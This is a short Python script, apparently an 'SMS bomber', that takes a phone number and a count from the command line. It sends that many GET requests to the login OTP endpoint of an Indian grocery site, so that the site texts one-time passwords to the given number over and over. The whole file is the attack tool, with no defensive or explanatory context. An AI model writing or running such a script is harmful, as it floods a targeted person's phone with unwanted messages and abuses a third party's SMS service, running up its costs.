import requests
import sys
import os

for i in range(int(sys.argv[2])):
    print(i+1)
    response = requests.get('https://www.naturesbasket.co.in/Handlers/LoginRegistrationMaster.ashx?sendotp='+sys.argv[1])
